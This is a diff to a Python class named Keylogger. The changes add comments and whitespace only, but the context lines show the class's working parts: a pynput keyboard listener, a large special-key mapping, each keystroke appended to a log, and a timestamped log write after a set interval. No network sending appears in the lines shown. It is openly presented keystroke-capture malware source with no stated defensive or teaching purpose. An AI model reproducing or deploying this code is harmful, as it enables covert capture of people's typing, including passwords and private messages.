@@ -8,13 +8,15 @@ class Keylogger:
     def __init__(self,interval):
         self.interval = interval
         self.log = ""
-
+	
     def start(self):
+	    #start listener and writeLog
         listener = keyboard.Listener(on_press=self.on_press)
         listener.start()
         sleep(self.interval)
         self.writeLog()
     def on_press(self, key):
+	    # key mapping and save pressed key
         specialKeys = {"None":"", "Key.esc":"" , "Key.f1":"" , "Key.f2":"" , "Key.f3":"" , "Key.f4":"" , "Key.f5":"" , "Key.f6":"" , "Key.f7":"" , "Key.f8":"" , "Key.f9":"" , "Key.f10":"" , "Key.f11":"" , "Key.f12":"" , "Key.num_lock":"", "Key.pause":"", "Key.scroll_lock":"", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "", "Key.tabNone" : "", "Key.enter": "" }
         noneKey = {"None":""}
         try:
@@ -33,6 +35,7 @@ class Keylogger:
         self.log += ""
 
     def writeLog(self):
+	    #writing log
         now = datetime.now()
         currentTime = now.strftime("%d/%m/%Y %H:%M:%S")
         logC = currentTime + " - "
